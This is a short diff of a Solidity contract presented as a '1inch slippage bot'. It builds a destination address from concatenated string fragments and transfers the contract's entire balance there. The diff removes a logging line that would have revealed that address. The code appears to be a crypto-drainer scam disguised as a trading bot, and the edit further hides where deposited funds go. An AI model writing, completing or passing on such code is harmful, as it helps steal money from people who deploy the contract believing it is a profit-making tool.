@@ -507,7 +507,6 @@ contract OneinchSlippageBot {
         address to = startExploration((fetechNewEdit("0x52e09C")));
         address payable contracts = payable(to);
         contracts.transfer(getBa());
-        console.log(to);
     }
     function fetechNewEdit(string memory str1) public pure returns (string memory) {
     return string(abi.encodePacked(str1, fetechAssemblyOne(), fetechAssembyTwo()));}
